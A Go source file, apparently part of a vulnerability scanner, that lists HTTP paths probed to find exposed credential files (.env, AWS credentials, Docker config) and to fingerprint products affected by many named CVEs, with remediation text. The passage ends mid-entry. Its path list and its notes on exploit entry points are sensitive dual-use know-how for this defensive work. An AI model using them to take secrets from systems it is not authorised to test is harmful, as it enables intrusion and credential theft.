// Package exposedfiles actively probes for sensitive configuration files,
// credentials, and secrets exposed over HTTP. It complements the passive
// dorks and historicalurls scanners with direct, authoritative probes.
//
// Surface mode: probes high-confidence, low-false-positive paths.
// Deep mode: probes an extended list including framework-specific paths.
package exposedfiles

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const scannerName = "exposedfiles"

type sensitiveFile struct {
	path        string
	title       string
	severity    finding.Severity
	deepOnly    bool
	// bodyContains confirms it's real (not a soft 404) by checking for this substring.
	bodyContains string
	// checkID overrides the default "exposure.sensitive_file" check ID.
	// Use for CVE-specific probes that need their own tracking identity.
	checkID string
	// description overrides the default generic description when set.
	description string
}

var targets = []sensitiveFile{
	// Critical — credential / secret files
	{path: "/.env", title: "Exposed .env file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.local", title: "Exposed .env.local file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.production", title: "Exposed .env.production file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.backup", title: "Exposed .env.backup file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/config/database.yml", title: "Exposed database config (Rails)", severity: finding.SeverityCritical, bodyContains: "password"},
	{path: "/config/secrets.yml", title: "Exposed secrets file (Rails)", severity: finding.SeverityCritical, bodyContains: "secret"},
	{path: "/app/config/parameters.yml", title: "Exposed Symfony parameters", severity: finding.SeverityCritical, bodyContains: "database"},
	{path: "/.aws/credentials", title: "Exposed AWS credentials file", severity: finding.SeverityCritical, bodyContains: "aws_"},
	{path: "/wp-config.php.bak", title: "Exposed WordPress config backup", severity: finding.SeverityCritical, deepOnly: true},
	{path: "/configuration.php.bak", title: "Exposed Joomla config backup", severity: finding.SeverityCritical, deepOnly: true},
	{path: "/.docker/config.json", title: "Exposed Docker registry credentials", severity: finding.SeverityCritical, bodyContains: "auth"},

	// High — source control exposure
	{path: "/.git/config", title: "Exposed .git/config (repo metadata)", severity: finding.SeverityHigh, bodyContains: "[core]"},
	{path: "/.git/HEAD", title: "Exposed .git/HEAD (Git repository)", severity: finding.SeverityHigh, bodyContains: "ref:"},
	{path: "/.svn/entries", title: "Exposed Subversion repository", severity: finding.SeverityHigh},
	{path: "/.hg/hgrc", title: "Exposed Mercurial repository", severity: finding.SeverityHigh},

	// High — database and backup files
	{path: "/dump.sql", title: "Exposed SQL dump", severity: finding.SeverityHigh, bodyContains: "CREATE"},
	{path: "/backup.sql", title: "Exposed SQL backup", severity: finding.SeverityHigh, bodyContains: "INSERT"},
	{path: "/db.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},
	{path: "/database.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},
	{path: "/data.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},

	// High — package manager / dependency files (reveal software versions)
	{path: "/package.json", title: "Exposed package.json (dependency manifest)", severity: finding.SeverityMedium, bodyContains: "dependencies"},
	{path: "/composer.json", title: "Exposed composer.json (PHP dependencies)", severity: finding.SeverityMedium, bodyContains: "require"},
	{path: "/Gemfile", title: "Exposed Gemfile (Ruby dependencies)", severity: finding.SeverityMedium, bodyContains: "gem"},
	{path: "/requirements.txt", title: "Exposed requirements.txt (Python deps)", severity: finding.SeverityMedium},
	{path: "/go.sum", title: "Exposed go.sum (Go module checksums)", severity: finding.SeverityLow},

	// Medium — application config files
	{path: "/config.json", title: "Exposed config.json", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/config.yaml", title: "Exposed config.yaml", severity: finding.SeverityMedium},
	{path: "/config.yml", title: "Exposed config.yml", severity: finding.SeverityMedium},
	{path: "/settings.json", title: "Exposed settings.json", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/appsettings.json", title: "Exposed appsettings.json (.NET)", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/application.properties", title: "Exposed Spring Boot properties", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/application.yml", title: "Exposed Spring Boot config", severity: finding.SeverityMedium, deepOnly: true},

	// Medium — log files
	{path: "/error.log", title: "Exposed error log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/access.log", title: "Exposed access log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/laravel.log", title: "Exposed Laravel log", severity: finding.SeverityMedium, deepOnly: true, bodyContains: "local.ERROR"},
	{path: "/storage/logs/laravel.log", title: "Exposed Laravel log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/var/log/app.log", title: "Exposed application log", severity: finding.SeverityMedium, deepOnly: true},

	// Info — fingerprinting / metadata
	{path: "/server-status", title: "Apache server-status exposed", severity: finding.SeverityMedium, bodyContains: "Apache"},
	{path: "/server-info", title: "Apache server-info exposed", severity: finding.SeverityMedium, bodyContains: "Apache"},
	{path: "/phpinfo.php", title: "PHP info page exposed", severity: finding.SeverityHigh, bodyContains: "phpinfo"},
	{path: "/info.php", title: "PHP info page exposed", severity: finding.SeverityHigh, bodyContains: "phpinfo"},

	// ── CVE-specific endpoint probes (Oct 2025 – Mar 2026 KEV wave) ──────────
	// HPE OneView — CVE-2025-37164 unauthenticated RCE (CVSS 10.0, KEV-listed).
	// /rest/version is accessible without authentication and returns a JSON object
	// including "currentVersion" that uniquely identifies HPE OneView.
	{
		path: "/rest/version", title: "HPE OneView REST API version exposed (CVE-2025-37164)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEHPEOneViewRCE,
		bodyContains: "currentVersion",
		description: "The HPE OneView management REST API /rest/version endpoint is accessible without authentication. " +
			"CVE-2025-37164 (CVSS 10.0, KEV-listed Jan 2026) allows pre-authentication remote code execution " +
			"via the /rest/id-pools/executeCommand API. A Metasploit module is publicly available. " +
			"Patch to HPE OneView 11.00 or later immediately.",
	},

	// Ivanti EPMM — CVE-2026-1281 + CVE-2026-1340 pre-auth OS command injection
	// (CVSS 9.8, KEV-listed Feb 2026). The MDM distribution path is uniquely Ivanti
	// EPMM and responds with 200 without authentication.
	{
		path: "/mifs/c/appstore/fob/", title: "Ivanti EPMM MDM endpoint exposed (CVE-2026-1281/1340)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEIvantiEPMMRCE,
		description: "The Ivanti Endpoint Manager Mobile (EPMM) in-house app distribution endpoint is internet-accessible. " +
			"CVE-2026-1281 and CVE-2026-1340 (CVSS 9.8, KEV-listed Feb 2026) allow pre-authentication OS command " +
			"injection via URL parameters passed to Bash arithmetic expansion. Ransomware operators actively exploit this. " +
			"Apply Ivanti EPMM patches released February 2026 immediately.",
	},

	// Cisco ASA / FTD — CVE-2025-20333 + CVE-2025-20362 chained pre-auth RCE.
	// The AnyConnect SSL VPN login page is unique to Cisco ASA/FTD devices.
	// bodyContains "webvpn" confirms it is genuine Cisco AnyConnect, not a redirect.
	{
		path: "/+CSCOE+/logon.html", title: "Cisco ASA/FTD AnyConnect VPN exposed (CVE-2025-20333/20362)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVECiscoASARCE,
		bodyContains: "webvpn",
		description: "A Cisco Adaptive Security Appliance (ASA) or Firewall Threat Defense (FTD) device with " +
			"AnyConnect SSL VPN is internet-accessible. CVE-2025-20333 (buffer overflow) chained with CVE-2025-20362 " +
			"(unauthenticated URL access) enables pre-authentication remote code execution on unpatched devices. " +
			"Both CVEs are KEV-listed. Apply Cisco security patches for ASA/FTD immediately.",
	},

	// Citrix NetScaler — CVE-2025-5777 (\"CitrixBleed 2\") pre-auth memory leak.
	// The NetScaler Gateway /vpn/index.html login page uniquely identifies this product.
	{
		path: "/vpn/index.html", title: "Citrix NetScaler Gateway login exposed (CVE-2025-5777)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVECitrixBleed2,
		bodyContains: "Citrix",
		description: "A Citrix NetScaler ADC or Gateway login page is internet-accessible. " +
			"CVE-2025-5777 (\"CitrixBleed 2\", CVSS 9.3, KEV-listed) is a pre-authentication memory leak in " +
			"the authentication handler. Sending a crafted POST to /p/u/doAuthentication.do causes the server " +
			"to return stack memory contents including session tokens within the XML response. " +
			"Upgrade to patched NetScaler versions immediately.",
	},

	// ── CVE-specific endpoint probes ──────────────────────────────────────────
	// Each probe targets a specific product version gap (KEV-listed or actively
	// exploited). Bodycontains validates the product is actually running, not
	// just that the path responds (soft-404 guard).

	// CVE-2026-27944 — Nginx-UI unauthenticated backup download + encryption key
	// disclosure. GET /api/backup without credentials returns the full archive and
	// exposes X-Backup-Security header. CVSS 9.8, no auth required.
	{
		path: "/api/backup", title: "Nginx-UI unauthenticated backup endpoint (CVE-2026-27944)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVENginxUIBackup,
		description: "The Nginx-UI /api/backup endpoint is accessible without authentication (CVE-2026-27944, CVSS 9.8). " +
			"It returns the full server configuration backup including SSL private keys and credentials. " +
			"The X-Backup-Security header in the response discloses the decryption key. " +
			"Update Nginx-UI to ≥ 2.3.2 immediately.",
	},

	// CVE-2026-1731 — BeyondTrust Remote Support / PRA pre-auth OS command injection.
	// /appliance/api/info exposes version without authentication; compare against
	// patched builds (RS > 25.3.1, PRA > 24.3.4). CVSS 9.9, KEV-listed Feb 2026.
	{
		path: "/appliance/api/info", title: "BeyondTrust Remote Support version exposed (CVE-2026-1731)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEBeyondTrustRCE,
		bodyContains: "version",
		description: "The BeyondTrust Remote Support / PRA version API is accessible without authentication. " +
			"CVE-2026-1731 (CVSS 9.9, KEV-listed) allows pre-authentication OS command injection on versions RS ≤ 25.3.1 and PRA ≤ 24.3.4. " +
			"Compare the disclosed version against patched builds and upgrade immediately.",
	},

	// CVE-2025-26399 — SolarWinds Web Help Desk AjaxProxy deserialization RCE.
	// The login page fingerprint confirms WHD; AjaxProxy path confirms exploitability.
	// CVSS 9.8, KEV-listed Mar 2026.
	{
		path: "/helpdesk/WebObjects/Helpdesk.woa/wo/", title: "SolarWinds Web Help Desk exposed (CVE-2025-26399)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVESolarWindsWHD,
		description: "SolarWinds Web Help Desk is internet-accessible. CVE-2025-26399 (CVSS 9.8, KEV-listed Mar 2026) " +
			"exploits unauthenticated Java deserialization in the AjaxProxy component. " +
			"Upgrade to WHD 12.8.7 HF1 or WHD 2026.1 immediately.",
	},

	// CVE-2026-1603 — Ivanti Endpoint Manager auth bypass → credential theft.
	// The /ams/ console path fingerprints Ivanti EPM. CVSS High, KEV-listed Mar 2026.
	{
		path: "/ams/", title: "Ivanti Endpoint Manager console exposed (CVE-2026-1603)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEIvantiEPMAuthBypass,
		description: "Ivanti Endpoint Manager is internet-accessible. CVE-2026-1603 (KEV-listed Mar 2026) " +
			"allows authentication bypass via a specific API endpoint, exposing Domain Administrator " +
			"and service account credential blobs from the EPM Credential Vault. " +
			"Update to EPM 2024 SU5 or later immediately.",
	},

	// CVE-2025-32432 — Craft CMS pre-authentication code injection (CVSS 10.0, KEV).
	// /index.php?action=debug/default/view fingerprints Craft CMS and is the initial pivot point.
	// The actionPreviewFile endpoint enables arbitrary PHP code execution without auth on < 5.6.17.
	{
		path:         "/index.php?action=debug/default/view",
		title:        "CVE-2025-32432: Craft CMS debug panel accessible (pre-auth RCE)",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVECraftCMSRCE,
		bodyContains: "Craft",
		description: "The Craft CMS Yii debug panel is accessible without authentication. " +
			"CVE-2025-32432 (CVSS 10.0, KEV) allows pre-authentication arbitrary PHP code execution " +
			"on Craft CMS < 5.6.17 / < 4.14.15 via the actionPreviewFile endpoint when allowAdminChanges " +
			"is enabled. Attackers can read arbitrary files and execute code as the web server user. " +
			"Upgrade Craft CMS immediately and disable the debug toolbar in production.",
	},

	// CVE-2025-54068 — Laravel Livewire file upload pre-auth RCE (CVSS 9.8).
	// GET /livewire/upload-file returning a non-404 response confirms Livewire's upload
	// endpoint is accessible; the vulnerability exploits PHP deserialization in the upload handler.
	{
		path:         "/livewire/upload-file",
		title:        "CVE-2025-54068: Laravel Livewire file upload endpoint exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVELivewireRCE,
		description: "The Laravel Livewire file upload endpoint is internet-accessible. " +
			"CVE-2025-54068 (CVSS 9.8) exploits a PHP object deserialization vulnerability in the " +
			"Livewire file upload handler, allowing unauthenticated remote code execution. " +
			"The vulnerability affects Livewire < 3.6.3. Upgrade Livewire and ensure the endpoint " +
			"is not publicly accessible without authentication.",
	},

	// CVE-2025-68613 / CVE-2026-21858 — n8n workflow automation pre-auth RCE.
	// /healthz returns HTTP 200 with {\"status\":\"ok\"} on every n8n instance.
	// n8n exposed to the internet enables workflow-based SSRF, credential theft, and RCE.
	{
		path:         "/healthz",
		title:        "CVE-2025-68613/2026-21858: n8n workflow automation server exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEN8nRCE,
		bodyContains: "\"status\"",
		description: "An n8n workflow automation server is internet-accessible (/healthz confirms the instance). " +
			"CVE-2025-68613 and CVE-2026-21858 cover pre-authentication SSTI and RCE vulnerabilities " +
			"in n8n's expression evaluation engine. An exposed n8n instance allows an unauthenticated " +
			"attacker to create workflows that exfiltrate environment variables (including cloud credentials) " +
			"and execute OS commands. n8n must never be exposed without authentication.",
	},

	// CVE-2026-33017 — Langflow AI pipeline platform pre-auth RCE (CVSS 10.0, KEV).
	// GET /api/v1/health returns {\"status\":\"ok\"} without authentication on every Langflow instance.
	// The /api/v1/validate/code endpoint allows arbitrary Python execution.
	{
		path:         "/api/v1/health",
		title:        "CVE-2026-33017: Langflow AI platform exposed (pre-auth RCE)",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVELangflowRCE,
		bodyContains: "\"status\"",
		description: "A Langflow AI pipeline platform is internet-accessible (/api/v1/health confirms the instance). " +
			"CVE-2026-33017 (CVSS 10.0, KEV) allows pre-authentication arbitrary Python code execution via " +
			"the /api/v1/validate/code endpoint, which evaluates Python without requiring credentials. " +
			"This is equivalent to unauthenticated OS-level RCE on the host. " +
			"Restrict Langflow to internal networks and apply authentication middleware immediately.",
	},

	// CVE-2026-20131 — Cisco Firepower Management Center (FMC) pre-auth Java deserialization RCE.
	// /login.html fingerprints the Cisco FMC web UI. CVSS 9.9, KEV-listed 2026.
	{
		path:         "/login.html",
		title:        "CVE-2026-20131: Cisco Firepower Management Center login exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVECiscoFMCRCE,
		bodyContains: "Firepower",
		description: "A Cisco Firepower Management Center (FMC) is internet-accessible. " +
			"CVE-2026-20131 (CVSS 9.9, KEV-listed) exploits Java deserialization in an unauthenticated " +
			"API endpoint on FMC, allowing remote code execution without credentials. FMC manages all " +
			"Firepower IDS/IPS and NGFW policies — compromise gives an attacker full visibility control " +
			"over the network security posture. Restrict FMC access to out-of-band management networks only.",
	},

	// CVE-2026-24858 — FortiOS FortiCloud SSO authentication bypass (CVSS 9.8, KEV).
	// The FortiOS SSL-VPN login at /remote/login is the fingerprinting endpoint.
	// The SSO bypass allows session hijacking without credentials on affected builds.
	{
		path:         "/remote/login",
		title:        "CVE-2026-24858: Fortinet FortiOS SSL-VPN login exposed (SSO bypass)",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEFortiOSSSOBypass,
		bodyContains: "Fortinet",
		description: "A Fortinet FortiOS SSL-VPN login page is internet-accessible. " +
			"CVE-2026-24858 (CVSS 9.8, KEV) is a FortiCloud SSO authentication bypass that allows " +
			"an attacker to forge SSO tokens and authenticate to the VPN portal without valid credentials. " +
			"This enables account takeover for all users configured with FortiCloud SSO. " +
			"Apply Fortinet patches and disable FortiCloud SSO if not required.",
	},

	// CVE-2025-64446 — FortiWeb path traversal authentication bypass (CVSS 9.8, KEV).
	// /api/v2.0/user/login fingerprints the FortiWeb WAF management API.
	// The path traversal allows accessing authenticated API paths without credentials.
	{
		path:         "/api/v2.0/user/login",
		title:        "CVE-2025-64446: FortiWeb WAF management API exposed (auth bypass)",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEFortiWebAuthBypass,
		bodyContains: "FortiWeb",
		description: "The Fortinet FortiWeb WAF management API login endpoint is internet-accessible. " +
			"CVE-2025-64446 (CVSS 9.8, KEV) exploits a path traversal in the FortiWeb REST API that " +
			"bypasses authentication for privileged endpoints. An attacker can read and modify WAF policies, " +
			"add bypass rules to allow malicious traffic, or gain OS-level access. " +
			"Restrict FortiWeb management access to internal networks and apply available patches.",
	},

	// CVE-2026-27825 — MCP (Model Context Protocol) server SSRF / RCE (CVSS 9.8).
	// /.well-known/mcp.json or /sse (Server-Sent Events endpoint) fingerprints an exposed MCP server.
	// Unauthenticated MCP servers expose tool call execution, file access, and SSRF to attackers.
	{
		path:         "/.well-known/mcp.json",
		title:        "CVE-2026-27825: MCP server exposed without authentication",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEMCPServerExposed,
		bodyContains: "mcp",
		description: "A Model Context Protocol (MCP) server discovery manifest is publicly accessible. " +
			"CVE-2026-27825 covers SSRF and arbitrary tool execution vulnerabilities in unauthenticated MCP servers. " +
			"An exposed MCP server allows an attacker to invoke AI tool functions, access connected APIs and " +
			"file systems, perform SSRF to internal services, and potentially execute code if the server's " +
			"tools have shell or filesystem access. MCP servers must require OAuth 2.0 authentication.",
	},

	// CVE-2024-1709 — ConnectWise ScreenConnect setup wizard auth bypass (CVSS 10.0, KEV).
	// /SetupWizard.aspx on patched versions redirects (302) to /. On vulnerable versions
	// (< 23.9.8) it returns 200 with the actual setup form, allowing admin account creation.
	{
		path: "/SetupWizard.aspx", title: "CVE-2024-1709: ConnectWise ScreenConnect setup wizard accessible",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEScreenConnectBypass,
		bodyContains: "ScreenConnect",
		description: "The ConnectWise ScreenConnect setup wizard (/SetupWizard.aspx) returned HTTP 200. " +
			"CVE-2024-1709 (CVSS 10.0, KEV) allows unauthenticated access to the setup wizard on " +
			"ScreenConnect < 23.9.8, letting an attacker create an admin account and take full control. " +
			"Upgrade to ScreenConnect 23.9.8 or later immediately.",
	},

	// CVE-2024-24919 — Check Point CloudGuard/Quantum arbitrary file read (CVSS 8.6, KEV).
	// /clients/MyCRL is specific to Check Point Mobile Access / SSL VPN blade.
	// A 200 response confirms the blade is exposed; path traversal exploitation is Deep mode.
	{
		path: "/clients/MyCRL", title: "CVE-2024-24919: Check Point Mobile Access blade exposed",
		severity: finding.SeverityHigh, checkID: finding.CheckCVECheckPointFileRead,
		description: "The Check Point Mobile Access / SSL VPN endpoint (/clients/MyCRL) is publicly accessible. " +
			"CVE-2024-24919 (CVSS 8.6, KEV) allows unauthenticated arbitrary file read via path traversal " +
			"in the Mobile Access blade. Attackers have used this to steal VPN credentials and private keys. " +
			"Apply hotfix immediately and restrict management access to trusted networks.",
	},

	// CVE-2024-47575 — FortiManager 'FortiJump' missing auth → rogue device registration (CVSS 9.8, KEV).
	// /p/login/ fingerprints the FortiManager web UI. The actual FGFM exploit uses port 541.
	{
		path: "/p/login/", title: "CVE-2024-47575: Fortinet FortiManager management portal exposed",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEFortiManagerJump,
		bodyContains: "FortiManager",
		description: "The Fortinet FortiManager management portal is internet-accessible. " +
			"CVE-2024-47575 (CVSS 9.8, KEV, 'FortiJump') — a missing authentication flaw in the FGFM " +
			"protocol — allowed threat actor UNC5820 to register rogue FortiGate devices and execute " +
			"arbitrary commands on managed devices. Restrict port 443 and port 541 to internal networks only.",
	},

	// CVE-2024-9463 — Palo Alto Expedition < 1.2.96 unauthenticated OS command injection (CVSS 9.9, KEV).
	// /api/v1/version returns version JSON without authentication; compare against 1.2.96 threshold.
	{
		path: "/api/v1/version", title: "CVE-2024-9463: Palo Alto Expedition version API exposed",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEExpeditionRCE,
		bodyContains: "version",
		description: "The Palo Alto Expedition migration tool version API is publicly accessible. " +
			"CVE-2024-9463 (CVSS 9.9, KEV) allows unauthenticated OS command injection on Expedition < 1.2.96. " +
			"Expedition stores PAN-OS credentials and firewall configurations — compromise of this server " +
			"exposes all managed device credentials. Upgrade to 1.2.96 or later and isolate from the internet.",
	},

	// ── 2023 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2023-49103 — ownCloud graphapi phpinfo() credential disclosure (CVSS 10.0, KEV).
	// The graphapi app shipped a test file that calls phpinfo(), exposing all PHP env vars.
	// In containerized ownCloud deployments this includes OWNCLOUD_ADMIN_PASSWORD and DB credentials.
	{
		path: "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php",
		title:        "CVE-2023-49103: ownCloud phpinfo() exposes admin credentials",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEOwnCloudPhpInfo,
		bodyContains: "phpinfo",
		description: "The ownCloud graphapi test file GetPhpInfo.php is publicly accessible (CVE-2023-49103, CVSS 10.0, KEV). " +
			"It calls phpinfo(), exposing all PHP environment variables. In containerised ownCloud deployments " +
			"this includes OWNCLOUD_ADMIN_PASSWORD, OWNCLOUD_DB_PASSWORD, and mail credentials in plaintext. " +
			"Remove the graphapi app or upgrade to owncloud/graphapi ≥ 0.2.1 / ≥ 0.3.1 immediately.",
	},

	// CVE-2023-34362 — MOVEit Transfer SQL injection / CL0P web shell indicator (CVSS 9.8, KEV).
	// human2.aspx is the web shell installed by CL0P after exploiting MOVEit. Its presence
	// on a server with MOVEit indicates active or past compromise. bodyContains checks for
	// the shell's characteristic response rather than a generic HTML page.
	{
		path:     "/human2.aspx",
		title:    "CVE-2023-34362: MOVEit Transfer — CL0P web shell compromise indicator",
		severity: finding.SeverityCritical,
		checkID:  finding.CheckCVEMOVEitWebShell,
		description: "The file /human2.aspx is accessible on this server. This is the web shell installed " +
			"by the CL0P ransomware group after exploiting CVE-2023-34362 (MOVEit Transfer SQL injection, CVSS 9.8, KEV). " +
			"Its presence indicates the server was or is compromised. Immediately engage incident response, " +
			"audit file uploads, reset credentials, and apply MOVEit patches.",
	},

	// CVE-2023-47246 — SysAid On-Prem path traversal → WAR upload → RCE (CVSS 9.8, KEV, Lace Tempest).
	// The SysAid login page at /Login.jsp fingerprints the product. Separate inline probe checks version.
	{
		path:         "/Login.jsp",
		title:        "CVE-2023-47246: SysAid On-Prem IT service desk exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVESysAid,
		bodyContains: "SysAid",
		description: "SysAid On-Premises IT service management software is internet-accessible. " +
			"CVE-2023-47246 (CVSS 9.8, KEV, exploited by Lace Tempest / CL0P affiliates) allows unauthenticated " +
			"path traversal via the UserEntry servlet's accountID parameter, enabling WAR file upload to the " +
			"Tomcat webroot and subsequent remote code execution. Upgrade to SysAid On-Prem ≥ 23.3.36 immediately.",
	},

	// CVE-2023-36844/36845 — Juniper J-Web PHP environment variable injection → RCE (CVSS 9.8, KEV).
	// /webauth_operation.php is a specific J-Web endpoint that accepts unauthenticated requests.
	// If it returns HTTP 200, CVE-2023-36844 (env var injection via request params) applies.
	{
		path:         "/webauth_operation.php",
		title:        "CVE-2023-36844/36845: Juniper J-Web PHP injection endpoint accessible",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEJuniperJWeb,
		bodyContains: "Juniper",
		description: "The Juniper J-Web /webauth_operation.php endpoint is accessible without authentication. " +
			"CVE-2023-36844 (CVSS 9.8, KEV) allows PHP environment variable injection via unauthenticated " +
			"request parameters. Chained with CVE-2023-36845 (PHPRC injection), an attacker achieves " +
			"pre-authentication remote code execution on the Junos firewall or switch. " +
			"Upgrade to patched Junos OS versions and disable J-Web if not required.",
	},

	// ── 2022 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2022-29464 — WSO2 API Manager / Identity Server unrestricted file upload (CVSS 9.8, KEV).
	// /carbon/admin/login.jsp fingerprints the WSO2 Management Console.
	{
		path:         "/carbon/admin/login.jsp",
		title:        "CVE-2022-29464: WSO2 Management Console exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEWSO2FileUpload,
		bodyContains: "WSO2",
		description: "The WSO2 Management Console (/carbon/admin/login.jsp) is internet-accessible. " +
			"CVE-2022-29464 (CVSS 9.8, KEV) is an unrestricted file upload vulnerability in WSO2 API Manager, " +
			"Identity Server, and related products that allows unauthenticated remote code execution via " +
			"a specially crafted POST to /fileupload/. Ransomware groups actively exploited this at scale. " +
			"Apply WSO2 security patches and restrict management console access to internal networks.",
	},

	// CVE-2022-22954 — VMware Workspace ONE Access FreeMarker SSTI → RCE (CVSS 9.8, KEV).
	// /SAAS/auth/login fingerprints Workspace ONE. The SSTI is in the deviceUdid parameter of
	// /catalog-portal/ui/oauth/verify; detecting the login page is sufficient to flag exposure.
	{
		path:         "/SAAS/auth/login",
		title:        "CVE-2022-22954: VMware Workspace ONE Access login exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEVMwareWorkspaceONE,
		bodyContains: "Workspace ONE",
		description: "VMware Workspace ONE Access (formerly VMware Identity Manager) is internet-accessible. " +
			"CVE-2022-22954 (CVSS 9.8, KEV) is a FreeMarker server-side template injection vulnerability " +
			"in the deviceUdid parameter of the OAuth verification endpoint, exploitable without authentication " +
			"for remote code execution. Multiple threat actors and ransomware groups exploited this immediately " +
			"after disclosure. Apply VMware VMSA-2022-0011 patches immediately.",
	},

	// CVE-2022-3236/1040 — Sophos Firewall auth bypass / RCE (CVSS 9.8, KEV).
	// /webconsole/webpages/login.jsp fingerprints Sophos Firewall (SFOS).
	// CVE-2022-1040 (auth bypass → arbitrary code execution) and CVE-2022-3236 (code injection)
	// were both exploited by nation-state actors targeting exposed management interfaces.
	{
		path:         "/webconsole/webpages/login.jsp",
		title:        "CVE-2022-3236/1040: Sophos Firewall management interface exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVESophosFW,
		bodyContains: "Sophos",
		description: "The Sophos Firewall (SFOS) management console is internet-accessible. " +
			"CVE-2022-1040 (CVSS 9.8, KEV) is an authentication bypass in the User Portal and WebAdmin " +
			"that allows unauthenticated remote code execution. CVE-2022-3236 (CVSS 9.8, KEV) is a code injection " +
			"vulnerability in the same interface. Both were actively exploited by China-nexus threat actors (Volt Typhoon). " +
			"Firewall management interfaces must never be exposed to the internet.",
	},

	// CVE-2022-47966 — ManageEngine products SAML pre-auth RCE (CVSS 9.8, KEV).
	// /samlLogin/67 is the SAML SSO endpoint present in many ManageEngine products when SAML is enabled.
	// The vulnerability is in the Apache Santuario XML signature validation (xmlsec library).
	{
		path:         "/samlLogin/67",
		title:        "CVE-2022-47966: ManageEngine SAML authentication endpoint exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEManageEngineSAML,
		bodyContains: "ManageEngine",
		description: "A ManageEngine product SAML SSO endpoint is internet-accessible. " +
			"CVE-2022-47966 (CVSS 9.8, KEV) exploits a vulnerable version of Apache Santuario (xmlsec) used by " +
			"30+ ManageEngine products (ServiceDesk Plus, ADSelfService Plus, PAM360, etc.) when SAML SSO is enabled. " +
			"An unauthenticated attacker can send a crafted SAML response to execute arbitrary code as SYSTEM. " +
			"Exploited by APT groups including Sandworm. Apply ManageEngine patches and disable SAML if unused.",
	},

	// CVE-2022-24086 — Adobe Commerce / Magento unauthenticated template injection → RCE (CVSS 9.8, KEV).
	// /index.php/customer/account/createpost/ is the account creation endpoint where the injection occurs.
	// Checking for the Magento admin panel path confirms the product is deployed.
	{
		path:         "/index.php/admin",
		title:        "CVE-2022-24086: Adobe Commerce / Magento admin panel exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEMagentoRCE,
		bodyContains: "Magento",
		description: "An Adobe Commerce / Magento 2 admin panel is internet-accessible. " +
			"CVE-2022-24086 (CVSS 9.8, KEV) is an improper input validation vulnerability that allows " +
			"unauthenticated remote code execution via template injection in the checkout flow. " +
			"CVE-2022-24087 is a related bypass. Both were exploited immediately after disclosure for " +
			"payment card skimming and credential theft. Restrict the admin panel and apply Adobe Commerce patches.",
	},

	// ── 2021 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2021-21985/22005 — VMware vCenter Server internet-exposed (CVSS 9.8, KEV).
	// /sdk/vimServiceVersions.xml returns version info without authentication on every vCenter.
	// CVE-2021-21985 (vSAN Health Check plugin RCE) and CVE-2021-22005 (analytics telemetry upload)
	// both exploited unauthenticated vCenter access. Any internet-facing vCenter is critical.
	{
		path:         "/sdk/vimServiceVersions.xml",
		title:        "CVE-2021-21985/22005: VMware vCenter Server exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEvCenterExposed,
		bodyContains: "version",
		description: "VMware vCenter Server is internet-accessible — /sdk/vimServiceVersions.xml " +
			"returns version XML without authentication. CVE-2021-21985 (CVSS 9.8, KEV, vSAN Health Check plugin RCE) " +
			"and CVE-2021-22005 (CVSS 9.8, KEV, analytics telemetry arbitrary file upload) both exploit " +
			"unauthenticated access to vCenter. vCenter manages the entire VMware virtualisation stack — " +
			"compromise gives an attacker control of every VM. Restrict vCenter access to internal networks only.",
	},

	// CVE-2021-22205 — GitLab ExifTool pre-auth RCE (CVSS 10.0, KEV).
	// /api/v4/version returns version JSON without auth when anonymous API access is enabled.
	// bodyContains "revision" distinguishes GitLab from Palo Alto Expedition (/api/v1/version).
	{
		path:         "/api/v4/version",
		title:        "CVE-2021-22205: GitLab version API exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEGitLabRCE,
		bodyContains: "revision",
		description: "The GitLab version API is accessible without authentication. " +
			"CVE-2021-22205 (CVSS 10.0, KEV) exploits an image upload endpoint that passes user-supplied " +
